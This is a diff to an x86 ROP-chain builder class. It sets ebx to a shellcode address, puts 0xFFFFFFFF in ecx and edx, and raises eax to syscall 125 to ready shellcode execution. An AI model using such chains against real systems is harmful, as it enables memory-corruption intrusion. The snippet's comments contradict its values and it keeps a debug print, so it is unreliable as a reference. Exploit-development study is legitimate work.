@@ -324,24 +324,24 @@ class ROPMakerX86(object):
         #puts stack in to ebx (program)
 
         p += pack('<I', popEcx["vaddr"]) 
-        p += pack('<I', 0x00000030)#48)#popEcx["vaddr"]) 
+        p += pack('<I', 0xFFFFFFFF)#0x00000030)#48)#popEcx["vaddr"]) 
         print("CHECK FINAL:", p)
         p += self.__custompadding(popEcx, {"ebx": loc_of_shellcode})  
 
         #puts stack + 60 in to ecx (args)
 
         p += pack('<I', popEdx["vaddr"]) 
-        p += pack('<I', 0x00000004)#4) 
-        p += self.__custompadding(popEdx, {"ebx": loc_of_shellcode, "ecx": 0x00000030})  
+        p += pack('<I', 0xFFFFFFFF)#)00000004)#4) 
+        p += self.__custompadding(popEdx, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  
 
         #puts stack in to edx (env)
 
         p += pack('<I', xorEax["vaddr"]) 
-        p += self.__custompadding(xorEax, {"ebx": loc_of_shellcode, "ecx": 0x00000030})  
+        p += self.__custompadding(xorEax, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  
 
         for _ in range(125):
             p += pack('<I', incEax["vaddr"]) 
-            p += self.__custompadding(incEax, {"ebx": loc_of_shellcode, "ecx": 0x00000030})  # Don't overwrite ebx and ecx
+            p += self.__custompadding(incEax, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  # Don't overwrite ebx and ecx
 
         #sets eax to 125
 
